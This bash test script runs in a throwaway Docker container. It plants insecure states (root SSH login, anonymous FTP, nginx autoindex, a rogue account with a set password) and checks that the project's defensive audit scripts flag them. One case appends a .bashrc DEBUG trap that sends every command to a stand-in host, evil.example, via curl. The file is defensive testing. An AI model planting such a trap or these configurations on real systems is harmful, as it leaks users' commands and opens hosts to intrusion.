#!/usr/bin/env bash
# Containerized chaos validation for top-level defensive scripts.
#
# Goal: provide repeatable "no-VM" real-world-ish validation by spinning up
# a disposable Ubuntu container, intentionally introducing bad states, and
# checking that scripts detect them.
#
# Usage:
#   bash tests/test_container_chaos.sh
#   bash tests/test_container_chaos.sh --case scored
#   bash tests/test_container_chaos.sh --case audit
#   bash tests/test_container_chaos.sh --case alias
#   bash tests/test_container_chaos.sh --image ubuntu:24.04

set -euo pipefail

CASE="all"
IMAGE="ubuntu:22.04"

while [[ $# -gt 0 ]]; do
    case "$1" in
        --case)
            CASE="${2:-all}"
            shift 2
            ;;
        --image)
            IMAGE="${2:-ubuntu:22.04}"
            shift 2
            ;;
        -h|--help)
            cat <<'USAGE'
Usage: bash tests/test_container_chaos.sh [options]

Options:
  --case <all|scored|audit|alias>   Run a specific scenario (default: all)
  --image <image>                   Ubuntu base image (default: ubuntu:22.04)
  -h, --help                        Show this help
USAGE
            exit 0
            ;;
        *)
            echo "Unknown argument: $1"
            exit 1
            ;;
    esac
done

if ! command -v docker >/dev/null 2>&1; then
    echo "Docker not found. Install Docker or use your existing container host first."
    exit 1
fi

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

echo "[INFO] Container chaos validation"
echo "[INFO] Repo:   $REPO_ROOT"
echo "[INFO] Image:  $IMAGE"
echo "[INFO] Case:   $CASE"

MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL="*" docker run --rm \
    -e CHAOS_CASE="$CASE" \
    -v "$REPO_ROOT:/repo" \
    "$IMAGE" \
    bash -seu <<'EOS'
export DEBIAN_FRONTEND=noninteractive

apt-get update -qq
apt-get install -y --no-install-recommends \
    bash coreutils findutils grep sed gawk \
    iproute2 net-tools procps cron util-linux \
    openssh-server nginx vsftpd curl ca-certificates \
    passwd binutils >/dev/null

chmod +x /repo/pcdc_*.sh || true

PASS=0
FAIL=0

pass() { echo "PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "FAIL: $1"; FAIL=$((FAIL + 1)); }

assert_contains() {
    local desc="$1"
    local pattern="$2"
    local output="$3"
    if echo "$output" | grep -qE "$pattern"; then
        pass "$desc"
    else
        fail "$desc (pattern not found: $pattern)"
    fi
}

run_scored_case() {
    echo ""
    echo "=== CASE: scored-service validator catches bad service configs ==="

    # Intentionally bad states
    mkdir -p /run/sshd /etc/nginx/conf.d
    if grep -q '^PermitRootLogin' /etc/ssh/sshd_config; then
        sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
    else
        echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
    fi

    if grep -q '^anonymous_enable=' /etc/vsftpd.conf; then
        sed -i 's/^anonymous_enable=.*/anonymous_enable=YES/' /etc/vsftpd.conf
    else
        echo 'anonymous_enable=YES' >> /etc/vsftpd.conf
    fi

    cat > /etc/nginx/conf.d/chaos_autoindex.conf <<'EOF'
server {
  listen 8080;
  root /var/www/html;
  location / {
    autoindex on;
  }
}
EOF

    service ssh start >/dev/null 2>&1 || true
    service nginx start >/dev/null 2>&1 || true
    service vsftpd start >/dev/null 2>&1 || true

    out=$(/repo/pcdc_scored_service_validate.sh sshd nginx vsftpd 2>&1 || true)

    assert_contains "sshd root login warning" 'sshd allows direct root login' "$out"
    assert_contains "nginx autoindex warning" 'nginx autoindex is enabled' "$out"
    assert_contains "vsftpd anonymous warning" 'vsftpd anonymous login is enabled' "$out"
}

run_audit_case() {
    echo ""
    echo "=== CASE: linux audit surfaces rogue account ==="

    useradd -m -s /bin/bash rogueaudit || true
    echo 'rogueaudit:TempPass123!' | chpasswd || true

    out=$(/repo/pcdc_linux_audit.sh 2>&1 || true)

    assert_contains "audit output contains rogue user" 'rogueaudit' "$out"
    assert_contains "audit section banner present" 'SECTION 1: USER & ACCOUNT AUDIT' "$out"
}

run_alias_case() {
    echo ""
    echo "=== CASE: alias detector catches DEBUG trap poisoning ==="

    echo 'trap "curl http://evil.example/?c=$BASH_COMMAND >/dev/null 2>&1" DEBUG' >> /root/.bashrc

    out=$(/repo/pcdc_alias_detector_v2.sh 2>&1 || true)

    assert_contains "alias detector flags dangerous trap" 'DANGEROUS TRAP' "$out"
}

case "${CHAOS_CASE:-all}" in
    all)
        run_scored_case
        run_audit_case
        run_alias_case
        ;;
    scored)
        run_scored_case
        ;;
    audit)
        run_audit_case
        ;;
    alias)
        run_alias_case
        ;;
    *)
        echo "Unknown CHAOS_CASE: ${CHAOS_CASE:-}"
        exit 1
        ;;
esac

echo ""
echo "=== container-chaos summary: $PASS passed, $FAIL failed ==="
if [[ "$FAIL" -gt 0 ]]; then
    exit 1
fi
EOS
